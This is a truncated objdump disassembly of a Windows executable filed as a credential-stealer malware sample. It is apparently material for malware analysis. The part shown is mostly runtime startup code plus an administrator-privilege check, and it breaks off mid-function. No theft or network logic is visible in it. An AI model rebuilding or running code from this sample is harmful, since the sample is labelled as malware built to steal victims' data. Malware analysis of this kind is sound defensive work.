
malware_samples/stealer/a196f8d8d998682107a5f6bb9003dde10ae5f6b0f979022eae42d5b795c35198.exe:     file format pei-x86-64


Disassembly of section .text:

00000002dc491000 <.text>:
   2dc491000:	55                   	push   %rbp
   2dc491001:	48 89 e5             	mov    %rsp,%rbp
   2dc491004:	48 83 ec 20          	sub    $0x20,%rsp
   2dc491008:	48 8d 05 01 30 03 00 	lea    0x33001(%rip),%rax        # 0x2dc4c4010
   2dc49100f:	48 89 c1             	mov    %rax,%rcx
   2dc491012:	e8 81 3d 01 00       	call   0x2dc4a4d98
   2dc491017:	48 83 c4 20          	add    $0x20,%rsp
   2dc49101b:	5d                   	pop    %rbp
   2dc49101c:	c3                   	ret
   2dc49101d:	55                   	push   %rbp
   2dc49101e:	48 89 e5             	mov    %rsp,%rbp
   2dc491021:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   2dc491028:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   2dc49102c:	89 55 18             	mov    %edx,0x18(%rbp)
   2dc49102f:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   2dc491033:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   2dc491037:	75 25                	jne    0x2dc49105e
   2dc491039:	8b 05 c1 2f 03 00    	mov    0x32fc1(%rip),%eax        # 0x2dc4c4000
   2dc49103f:	85 c0                	test   %eax,%eax
   2dc491041:	7e 11                	jle    0x2dc491054
   2dc491043:	8b 05 b7 2f 03 00    	mov    0x32fb7(%rip),%eax        # 0x2dc4c4000
   2dc491049:	83 e8 01             	sub    $0x1,%eax
   2dc49104c:	89 05 ae 2f 03 00    	mov    %eax,0x32fae(%rip)        # 0x2dc4c4000
   2dc491052:	eb 0a                	jmp    0x2dc49105e
   2dc491054:	b8 00 00 00 00       	mov    $0x0,%eax
   2dc491059:	e9 2b 02 00 00       	jmp    0x2dc491289
   2dc49105e:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   2dc491062:	0f 85 6f 01 00 00    	jne    0x2dc4911d7
   2dc491068:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   2dc49106f:	00 
   2dc491070:	c7 45 dc 30 00 00 00 	movl   $0x30,-0x24(%rbp)
   2dc491077:	8b 45 dc             	mov    -0x24(%rbp),%eax
   2dc49107a:	65 48 8b 00          	mov    %gs:(%rax),%rax
   2dc49107e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   2dc491082:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   2dc491086:	48 8b 40 08          	mov    0x8(%rax),%rax
   2dc49108a:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   2dc49108e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   2dc491095:	eb 21                	jmp    0x2dc4910b8
   2dc491097:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   2dc49109b:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
   2dc49109f:	75 09                	jne    0x2dc4910aa
   2dc4910a1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   2dc4910a8:	eb 45                	jmp    0x2dc4910ef
   2dc4910aa:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   2dc4910af:	48 8b 05 f2 54 03 00 	mov    0x354f2(%rip),%rax        # 0x2dc4c65a8
   2dc4910b6:	ff d0                	call   *%rax
   2dc4910b8:	48 8b 05 a1 9d 02 00 	mov    0x29da1(%rip),%rax        # 0x2dc4bae60
   2dc4910bf:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   2dc4910c3:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   2dc4910c7:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   2dc4910cb:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
   2dc4910d2:	00 
   2dc4910d3:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   2dc4910d7:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   2dc4910db:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   2dc4910df:	f0 48 0f b1 0a       	lock cmpxchg %rcx,(%rdx)
   2dc4910e4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   2dc4910e8:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
   2dc4910ed:	75 a8                	jne    0x2dc491097
   2dc4910ef:	48 8b 05 7a 9d 02 00 	mov    0x29d7a(%rip),%rax        # 0x2dc4bae70
   2dc4910f6:	8b 00                	mov    (%rax),%eax
   2dc4910f8:	83 f8 01             	cmp    $0x1,%eax
   2dc4910fb:	75 0c                	jne    0x2dc491109
   2dc4910fd:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   2dc491102:	e8 a9 3a 01 00       	call   0x2dc4a4bb0
   2dc491107:	eb 33                	jmp    0x2dc49113c
   2dc491109:	48 8b 05 60 9d 02 00 	mov    0x29d60(%rip),%rax        # 0x2dc4bae70
   2dc491110:	8b 00                	mov    (%rax),%eax
   2dc491112:	85 c0                	test   %eax,%eax
   2dc491114:	75 26                	jne    0x2dc49113c
   2dc491116:	48 8b 05 53 9d 02 00 	mov    0x29d53(%rip),%rax        # 0x2dc4bae70
   2dc49111d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   2dc491123:	48 8b 05 96 9d 02 00 	mov    0x29d96(%rip),%rax        # 0x2dc4baec0
   2dc49112a:	48 89 c2             	mov    %rax,%rdx
   2dc49112d:	48 8b 05 7c 9d 02 00 	mov    0x29d7c(%rip),%rax        # 0x2dc4baeb0
   2dc491134:	48 89 c1             	mov    %rax,%rcx
   2dc491137:	e8 6c 3c 01 00       	call   0x2dc4a4da8
   2dc49113c:	48 8b 05 2d 9d 02 00 	mov    0x29d2d(%rip),%rax        # 0x2dc4bae70
   2dc491143:	8b 00                	mov    (%rax),%eax
   2dc491145:	83 f8 01             	cmp    $0x1,%eax
   2dc491148:	75 26                	jne    0x2dc491170
   2dc49114a:	48 8b 05 4f 9d 02 00 	mov    0x29d4f(%rip),%rax        # 0x2dc4baea0
   2dc491151:	48 89 c2             	mov    %rax,%rdx
   2dc491154:	48 8b 05 35 9d 02 00 	mov    0x29d35(%rip),%rax        # 0x2dc4bae90
   2dc49115b:	48 89 c1             	mov    %rax,%rcx
   2dc49115e:	e8 45 3c 01 00       	call   0x2dc4a4da8
   2dc491163:	48 8b 05 06 9d 02 00 	mov    0x29d06(%rip),%rax        # 0x2dc4bae70
   2dc49116a:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   2dc491170:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   2dc491174:	75 1e                	jne    0x2dc491194
   2dc491176:	48 8b 05 e3 9c 02 00 	mov    0x29ce3(%rip),%rax        # 0x2dc4bae60
   2dc49117d:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   2dc491181:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
   2dc491188:	00 
   2dc491189:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   2dc49118d:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   2dc491191:	48 87 10             	xchg   %rdx,(%rax)
   2dc491194:	48 8b 05 65 9c 02 00 	mov    0x29c65(%rip),%rax        # 0x2dc4bae00
   2dc49119b:	48 8b 00             	mov    (%rax),%rax
   2dc49119e:	48 85 c0             	test   %rax,%rax
   2dc4911a1:	74 20                	je     0x2dc4911c3
   2dc4911a3:	48 8b 05 56 9c 02 00 	mov    0x29c56(%rip),%rax        # 0x2dc4bae00
   2dc4911aa:	4c 8b 08             	mov    (%rax),%r9
   2dc4911ad:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   2dc4911b1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4911b5:	49 89 d0             	mov    %rdx,%r8
   2dc4911b8:	ba 02 00 00 00       	mov    $0x2,%edx
   2dc4911bd:	48 89 c1             	mov    %rax,%rcx
   2dc4911c0:	41 ff d1             	call   *%r9
   2dc4911c3:	8b 05 37 2e 03 00    	mov    0x32e37(%rip),%eax        # 0x2dc4c4000
   2dc4911c9:	83 c0 01             	add    $0x1,%eax
   2dc4911cc:	89 05 2e 2e 03 00    	mov    %eax,0x32e2e(%rip)        # 0x2dc4c4000
   2dc4911d2:	e9 ad 00 00 00       	jmp    0x2dc491284
   2dc4911d7:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   2dc4911db:	0f 85 a3 00 00 00    	jne    0x2dc491284
   2dc4911e1:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   2dc4911e8:	00 
   2dc4911e9:	eb 0e                	jmp    0x2dc4911f9
   2dc4911eb:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   2dc4911f0:	48 8b 05 b1 53 03 00 	mov    0x353b1(%rip),%rax        # 0x2dc4c65a8
   2dc4911f7:	ff d0                	call   *%rax
   2dc4911f9:	48 8b 05 60 9c 02 00 	mov    0x29c60(%rip),%rax        # 0x2dc4bae60
   2dc491200:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   2dc491204:	48 c7 45 98 01 00 00 	movq   $0x1,-0x68(%rbp)
   2dc49120b:	00 
   2dc49120c:	48 c7 45 90 00 00 00 	movq   $0x0,-0x70(%rbp)
   2dc491213:	00 
   2dc491214:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   2dc491218:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   2dc49121c:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
   2dc491220:	f0 48 0f b1 0a       	lock cmpxchg %rcx,(%rdx)
   2dc491225:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   2dc491229:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   2dc49122e:	75 bb                	jne    0x2dc4911eb
   2dc491230:	48 8b 05 39 9c 02 00 	mov    0x29c39(%rip),%rax        # 0x2dc4bae70
   2dc491237:	8b 00                	mov    (%rax),%eax
   2dc491239:	83 f8 02             	cmp    $0x2,%eax
   2dc49123c:	74 0c                	je     0x2dc49124a
   2dc49123e:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   2dc491243:	e8 68 39 01 00       	call   0x2dc4a4bb0
   2dc491248:	eb 3a                	jmp    0x2dc491284
   2dc49124a:	48 8d 05 bf 2d 03 00 	lea    0x32dbf(%rip),%rax        # 0x2dc4c4010
   2dc491251:	48 89 c1             	mov    %rax,%rcx
   2dc491254:	e8 27 3b 01 00       	call   0x2dc4a4d80
   2dc491259:	48 8b 05 10 9c 02 00 	mov    0x29c10(%rip),%rax        # 0x2dc4bae70
   2dc491260:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   2dc491266:	48 8b 05 f3 9b 02 00 	mov    0x29bf3(%rip),%rax        # 0x2dc4bae60
   2dc49126d:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   2dc491271:	48 c7 45 80 00 00 00 	movq   $0x0,-0x80(%rbp)
   2dc491278:	00 
   2dc491279:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   2dc49127d:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   2dc491281:	48 87 10             	xchg   %rdx,(%rax)
   2dc491284:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc491289:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   2dc491290:	5d                   	pop    %rbp
   2dc491291:	c3                   	ret
   2dc491292:	55                   	push   %rbp
   2dc491293:	48 89 e5             	mov    %rsp,%rbp
   2dc491296:	48 83 ec 20          	sub    $0x20,%rsp
   2dc49129a:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   2dc49129e:	89 55 18             	mov    %edx,0x18(%rbp)
   2dc4912a1:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   2dc4912a5:	48 8b 05 84 9b 02 00 	mov    0x29b84(%rip),%rax        # 0x2dc4bae30
   2dc4912ac:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   2dc4912b2:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc4912b6:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc4912b9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4912bd:	49 89 c8             	mov    %rcx,%r8
   2dc4912c0:	48 89 c1             	mov    %rax,%rcx
   2dc4912c3:	e8 06 00 00 00       	call   0x2dc4912ce
   2dc4912c8:	48 83 c4 20          	add    $0x20,%rsp
   2dc4912cc:	5d                   	pop    %rbp
   2dc4912cd:	c3                   	ret
   2dc4912ce:	55                   	push   %rbp
   2dc4912cf:	48 89 e5             	mov    %rsp,%rbp
   2dc4912d2:	48 83 ec 30          	sub    $0x30,%rsp
   2dc4912d6:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   2dc4912da:	89 55 18             	mov    %edx,0x18(%rbp)
   2dc4912dd:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   2dc4912e1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   2dc4912e8:	48 8b 05 61 9b 02 00 	mov    0x29b61(%rip),%rax        # 0x2dc4bae50
   2dc4912ef:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc4912f2:	89 10                	mov    %edx,(%rax)
   2dc4912f4:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   2dc4912f8:	75 16                	jne    0x2dc491310
   2dc4912fa:	8b 05 00 2d 03 00    	mov    0x32d00(%rip),%eax        # 0x2dc4c4000
   2dc491300:	85 c0                	test   %eax,%eax
   2dc491302:	75 0c                	jne    0x2dc491310
   2dc491304:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   2dc49130b:	e9 41 01 00 00       	jmp    0x2dc491451
   2dc491310:	e8 f3 ca 00 00       	call   0x2dc49de08
   2dc491315:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   2dc491319:	74 06                	je     0x2dc491321
   2dc49131b:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   2dc49131f:	75 69                	jne    0x2dc49138a
   2dc491321:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc491325:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc491328:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc49132c:	49 89 c8             	mov    %rcx,%r8
   2dc49132f:	48 89 c1             	mov    %rax,%rcx
   2dc491332:	e8 e6 fc ff ff       	call   0x2dc49101d
   2dc491337:	89 45 fc             	mov    %eax,-0x4(%rbp)
   2dc49133a:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   2dc49133e:	0f 84 06 01 00 00    	je     0x2dc49144a
   2dc491344:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc491348:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc49134b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc49134f:	49 89 c8             	mov    %rcx,%r8
   2dc491352:	48 89 c1             	mov    %rax,%rcx
   2dc491355:	e8 66 dc 00 00       	call   0x2dc49efc0
   2dc49135a:	89 45 fc             	mov    %eax,-0x4(%rbp)
   2dc49135d:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   2dc491361:	75 27                	jne    0x2dc49138a
   2dc491363:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   2dc491367:	0f 85 e0 00 00 00    	jne    0x2dc49144d
   2dc49136d:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   2dc491371:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc491375:	49 89 d0             	mov    %rdx,%r8
   2dc491378:	ba 00 00 00 00       	mov    $0x0,%edx
   2dc49137d:	48 89 c1             	mov    %rax,%rcx
   2dc491380:	e8 98 fc ff ff       	call   0x2dc49101d
   2dc491385:	e9 c3 00 00 00       	jmp    0x2dc49144d
   2dc49138a:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   2dc49138e:	75 05                	jne    0x2dc491395
   2dc491390:	e8 42 c1 00 00       	call   0x2dc49d4d7
   2dc491395:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc491399:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc49139c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4913a0:	49 89 c8             	mov    %rcx,%r8
   2dc4913a3:	48 89 c1             	mov    %rax,%rcx
   2dc4913a6:	e8 65 24 00 00       	call   0x2dc493810
   2dc4913ab:	89 45 fc             	mov    %eax,-0x4(%rbp)
   2dc4913ae:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   2dc4913b2:	75 4e                	jne    0x2dc491402
   2dc4913b4:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   2dc4913b8:	75 48                	jne    0x2dc491402
   2dc4913ba:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   2dc4913be:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4913c2:	49 89 d0             	mov    %rdx,%r8
   2dc4913c5:	ba 00 00 00 00       	mov    $0x0,%edx
   2dc4913ca:	48 89 c1             	mov    %rax,%rcx
   2dc4913cd:	e8 3e 24 00 00       	call   0x2dc493810
   2dc4913d2:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   2dc4913d6:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4913da:	49 89 d0             	mov    %rdx,%r8
   2dc4913dd:	ba 00 00 00 00       	mov    $0x0,%edx
   2dc4913e2:	48 89 c1             	mov    %rax,%rcx
   2dc4913e5:	e8 d6 db 00 00       	call   0x2dc49efc0
   2dc4913ea:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   2dc4913ee:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc4913f2:	49 89 d0             	mov    %rdx,%r8
   2dc4913f5:	ba 00 00 00 00       	mov    $0x0,%edx
   2dc4913fa:	48 89 c1             	mov    %rax,%rcx
   2dc4913fd:	e8 1b fc ff ff       	call   0x2dc49101d
   2dc491402:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   2dc491406:	74 06                	je     0x2dc49140e
   2dc491408:	83 7d 18 03          	cmpl   $0x3,0x18(%rbp)
   2dc49140c:	75 42                	jne    0x2dc491450
   2dc49140e:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc491412:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc491415:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc491419:	49 89 c8             	mov    %rcx,%r8
   2dc49141c:	48 89 c1             	mov    %rax,%rcx
   2dc49141f:	e8 9c db 00 00       	call   0x2dc49efc0
   2dc491424:	89 45 fc             	mov    %eax,-0x4(%rbp)
   2dc491427:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   2dc49142b:	8b 55 18             	mov    0x18(%rbp),%edx
   2dc49142e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc491432:	49 89 c8             	mov    %rcx,%r8
   2dc491435:	48 89 c1             	mov    %rax,%rcx
   2dc491438:	e8 e0 fb ff ff       	call   0x2dc49101d
   2dc49143d:	85 c0                	test   %eax,%eax
   2dc49143f:	75 0f                	jne    0x2dc491450
   2dc491441:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   2dc491448:	eb 07                	jmp    0x2dc491451
   2dc49144a:	90                   	nop
   2dc49144b:	eb 04                	jmp    0x2dc491451
   2dc49144d:	90                   	nop
   2dc49144e:	eb 01                	jmp    0x2dc491451
   2dc491450:	90                   	nop
   2dc491451:	48 8b 05 f8 99 02 00 	mov    0x299f8(%rip),%rax        # 0x2dc4bae50
   2dc491458:	c7 00 ff ff ff ff    	movl   $0xffffffff,(%rax)
   2dc49145e:	8b 45 fc             	mov    -0x4(%rbp),%eax
   2dc491461:	48 83 c4 30          	add    $0x30,%rsp
   2dc491465:	5d                   	pop    %rbp
   2dc491466:	c3                   	ret
   2dc491467:	55                   	push   %rbp
   2dc491468:	48 89 e5             	mov    %rsp,%rbp
   2dc49146b:	48 83 ec 20          	sub    $0x20,%rsp
   2dc49146f:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   2dc491473:	48 8b 45 10          	mov    0x10(%rbp),%rax
   2dc491477:	48 89 c2             	mov    %rax,%rdx
   2dc49147a:	48 8d 05 8f 2b 03 00 	lea    0x32b8f(%rip),%rax        # 0x2dc4c4010
   2dc491481:	48 89 c1             	mov    %rax,%rcx
   2dc491484:	e8 27 39 01 00       	call   0x2dc4a4db0
   2dc491489:	48 83 c4 20          	add    $0x20,%rsp
   2dc49148d:	5d                   	pop    %rbp
   2dc49148e:	c3                   	ret
   2dc49148f:	90                   	nop
   2dc491490:	c3                   	ret
   2dc491491:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc491498:	00 00 00 00 
   2dc49149c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc4914a0:	31 c0                	xor    %eax,%eax
   2dc4914a2:	c3                   	ret
   2dc4914a3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc4914aa:	00 00 00 00 
   2dc4914ae:	66 90                	xchg   %ax,%ax
   2dc4914b0:	55                   	push   %rbp
   2dc4914b1:	57                   	push   %rdi
   2dc4914b2:	56                   	push   %rsi
   2dc4914b3:	53                   	push   %rbx
   2dc4914b4:	48 83 ec 28          	sub    $0x28,%rsp
   2dc4914b8:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   2dc4914bd:	48 8d 35 3c 6b 02 00 	lea    0x26b3c(%rip),%rsi        # 0x2dc4b8000
   2dc4914c4:	48 89 f1             	mov    %rsi,%rcx
   2dc4914c7:	ff 15 83 50 03 00    	call   *0x35083(%rip)        # 0x2dc4c6550
   2dc4914cd:	48 89 c3             	mov    %rax,%rbx
   2dc4914d0:	48 85 c0             	test   %rax,%rax
   2dc4914d3:	74 6b                	je     0x2dc491540
   2dc4914d5:	48 89 f1             	mov    %rsi,%rcx
   2dc4914d8:	ff 15 92 50 03 00    	call   *0x35092(%rip)        # 0x2dc4c6570
   2dc4914de:	48 8b 3d 73 50 03 00 	mov    0x35073(%rip),%rdi        # 0x2dc4c6558
   2dc4914e5:	48 8d 15 27 6b 02 00 	lea    0x26b27(%rip),%rdx        # 0x2dc4b8013
   2dc4914ec:	48 89 d9             	mov    %rbx,%rcx
   2dc4914ef:	48 89 05 4a 2b 03 00 	mov    %rax,0x32b4a(%rip)        # 0x2dc4c4040
   2dc4914f6:	ff d7                	call   *%rdi
   2dc4914f8:	48 8d 15 2a 6b 02 00 	lea    0x26b2a(%rip),%rdx        # 0x2dc4b8029
   2dc4914ff:	48 89 d9             	mov    %rbx,%rcx
   2dc491502:	48 89 c6             	mov    %rax,%rsi
   2dc491505:	ff d7                	call   *%rdi
   2dc491507:	48 89 05 02 5b 02 00 	mov    %rax,0x25b02(%rip)        # 0x2dc4b7010
   2dc49150e:	48 85 f6             	test   %rsi,%rsi
   2dc491511:	74 10                	je     0x2dc491523
   2dc491513:	48 8d 15 46 2b 03 00 	lea    0x32b46(%rip),%rdx        # 0x2dc4c4060
   2dc49151a:	48 8d 0d df ba 02 00 	lea    0x2badf(%rip),%rcx        # 0x2dc4bd000
   2dc491521:	ff d6                	call   *%rsi
   2dc491523:	48 8d 0d 36 00 00 00 	lea    0x36(%rip),%rcx        # 0x2dc491560
   2dc49152a:	48 83 c4 28          	add    $0x28,%rsp
   2dc49152e:	5b                   	pop    %rbx
   2dc49152f:	5e                   	pop    %rsi
   2dc491530:	5f                   	pop    %rdi
   2dc491531:	5d                   	pop    %rbp
   2dc491532:	e9 30 ff ff ff       	jmp    0x2dc491467
   2dc491537:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc49153e:	00 00 
   2dc491540:	48 8d 05 59 ff ff ff 	lea    -0xa7(%rip),%rax        # 0x2dc4914a0
   2dc491547:	48 8d 35 42 ff ff ff 	lea    -0xbe(%rip),%rsi        # 0x2dc491490
   2dc49154e:	48 89 05 bb 5a 02 00 	mov    %rax,0x25abb(%rip)        # 0x2dc4b7010
   2dc491555:	eb bc                	jmp    0x2dc491513
   2dc491557:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc49155e:	00 00 
   2dc491560:	55                   	push   %rbp
   2dc491561:	48 89 e5             	mov    %rsp,%rbp
   2dc491564:	48 83 ec 20          	sub    $0x20,%rsp
   2dc491568:	48 8b 05 a1 5a 02 00 	mov    0x25aa1(%rip),%rax        # 0x2dc4b7010
   2dc49156f:	48 85 c0             	test   %rax,%rax
   2dc491572:	74 09                	je     0x2dc49157d
   2dc491574:	48 8d 0d 85 ba 02 00 	lea    0x2ba85(%rip),%rcx        # 0x2dc4bd000
   2dc49157b:	ff d0                	call   *%rax
   2dc49157d:	48 8b 0d bc 2a 03 00 	mov    0x32abc(%rip),%rcx        # 0x2dc4c4040
   2dc491584:	48 85 c9             	test   %rcx,%rcx
   2dc491587:	74 0f                	je     0x2dc491598
   2dc491589:	48 83 c4 20          	add    $0x20,%rsp
   2dc49158d:	5d                   	pop    %rbp
   2dc49158e:	48 ff 25 8b 4f 03 00 	rex.W jmp *0x34f8b(%rip)        # 0x2dc4c6520
   2dc491595:	0f 1f 00             	nopl   (%rax)
   2dc491598:	48 83 c4 20          	add    $0x20,%rsp
   2dc49159c:	5d                   	pop    %rbp
   2dc49159d:	c3                   	ret
   2dc49159e:	90                   	nop
   2dc49159f:	90                   	nop
   2dc4915a0:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   2dc4915a7:	b8 00 05 00 00       	mov    $0x500,%eax
   2dc4915ac:	ba 02 00 00 00       	mov    $0x2,%edx
   2dc4915b1:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   2dc4915b7:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   2dc4915bd:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   2dc4915c2:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   2dc4915c7:	48 8d 4c 24 72       	lea    0x72(%rsp),%rcx
   2dc4915cc:	c7 44 24 6c 00 00 00 	movl   $0x0,0x6c(%rsp)
   2dc4915d3:	00 
   2dc4915d4:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   2dc4915db:	00 00 
   2dc4915dd:	c7 44 24 72 00 00 00 	movl   $0x0,0x72(%rsp)
   2dc4915e4:	00 
   2dc4915e5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   2dc4915ea:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   2dc4915f1:	00 
   2dc4915f2:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   2dc4915f9:	00 
   2dc4915fa:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   2dc491601:	00 
   2dc491602:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   2dc491609:	00 
   2dc49160a:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   2dc491611:	00 
   2dc491612:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   2dc491619:	00 
   2dc49161a:	ff 15 a0 4e 03 00    	call   *0x34ea0(%rip)        # 0x2dc4c64c0
   2dc491620:	89 c2                	mov    %eax,%edx
   2dc491622:	31 c0                	xor    %eax,%eax
   2dc491624:	85 d2                	test   %edx,%edx
   2dc491626:	74 25                	je     0x2dc49164d
   2dc491628:	31 c9                	xor    %ecx,%ecx
   2dc49162a:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   2dc49162f:	4c 8d 44 24 6c       	lea    0x6c(%rsp),%r8
   2dc491634:	ff 15 8e 4e 03 00    	call   *0x34e8e(%rip)        # 0x2dc4c64c8
   2dc49163a:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   2dc49163f:	ff 15 8b 4e 03 00    	call   *0x34e8b(%rip)        # 0x2dc4c64d0
   2dc491645:	83 7c 24 6c 01       	cmpl   $0x1,0x6c(%rsp)
   2dc49164a:	0f 94 c0             	sete   %al
   2dc49164d:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   2dc491654:	c3                   	ret
   2dc491655:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc49165c:	00 00 00 00 
   2dc491660:	48 83 ec 38          	sub    $0x38,%rsp
   2dc491664:	48 8d 15 e5 69 02 00 	lea    0x269e5(%rip),%rdx        # 0x2dc4b8050
   2dc49166b:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   2dc491670:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   2dc491675:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   2dc49167a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   2dc49167f:	e8 5c d9 00 00       	call   0x2dc49efe0
   2dc491684:	48 83 c4 38          	add    $0x38,%rsp
   2dc491688:	c3                   	ret
   2dc491689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc491690:	57                   	push   %rdi
   2dc491691:	53                   	push   %rbx
   2dc491692:	48 81 ec a8 0a 00 00 	sub    $0xaa8,%rsp
   2dc491699:	48 89 cb             	mov    %rcx,%rbx
   2dc49169c:	e8 ff fe ff ff       	call   0x2dc4915a0
   2dc4916a1:	84 c0                	test   %al,%al
   2dc4916a3:	75 0b                	jne    0x2dc4916b0
   2dc4916a5:	48 81 c4 a8 0a 00 00 	add    $0xaa8,%rsp
   2dc4916ac:	5b                   	pop    %rbx
   2dc4916ad:	5f                   	pop    %rdi
   2dc4916ae:	c3                   	ret
   2dc4916af:	90                   	nop
   2dc4916b0:	48 8d bc 24 a0 00 00 	lea    0xa0(%rsp),%rdi
   2dc4916b7:	00 
   2dc4916b8:	48 89 da             	mov    %rbx,%rdx
